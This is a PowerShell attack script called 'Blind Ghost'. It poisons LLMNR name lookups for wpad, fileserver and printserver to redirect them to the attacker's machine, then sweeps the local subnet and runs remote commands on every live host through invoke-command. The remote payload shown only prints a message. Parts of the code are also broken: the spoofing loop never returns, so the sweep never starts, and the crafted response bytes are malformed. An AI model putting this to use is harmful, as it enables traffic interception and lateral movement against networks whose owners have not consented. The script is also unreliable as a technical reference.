# Blind Ghost
function debug {
  param ([string]$msg)
  $ts = get-date -format "hh:mm:ss"
  write-host "[$ts] $msg"
}

function start-spoof {
  debug "starting llmnr/nbt-ns spoofer..."
  $udp = new-object system.net.sockets.udpclient 5355
  $ep = new-object system.net.ipendpoint([ipaddress]::any, 0)
  while ($true) {
    try {
      $bytes = $udp.receive([ref]$ep)
      $q = [text.encoding]::ascii.getstring($bytes[13..$bytes.length])
      if ($q -match "wpad|fileserver|printserver") {
        $resp = [byte[]](0x14,0xe8,0x81,0x80,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00) +
                $bytes[0..1] + 0x00,0x01,0xc0,0x0c,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x3c,0x00,0x04 +
                ([ipaddress][string](get-netipaddress -addressfamily ipv4 | where-object { $_.interfacealias -notlike "*loopback*" }).ipaddress).getaddressbytes()
        $udp.send($resp, $resp.length, $ep)
        debug "spoofed $q"
      }
    } catch {
      debug "spoof error: $_"
      $udp.close()
      break
    }
  }
}

function execute-payload {
  param ([string]$target)
  try {
    invoke-command -computername $target -scriptblock {
      write-output "Hello friend..."
    }
    debug "payload executed on $target"
  } catch {
    debug "failed to execute payload on $target"
  }
}
function start-attack {
  debug "starting attack..."
  start-spoof
  $subnet = (get-netipaddress -addressfamily ipv4 | where-object { $_.interfacealias -notlike "*loopback*" }).ipaddress -replace "\d+$", ""
  1..254 | foreach-object {
    $target = "$subnet$_"
    if (test-connection -computername $target -count 1 -quiet -errorsilentlycontinue) {
      debug "found live host: $target"
      execute-payload -target $target
    }
  }
}

start-attack
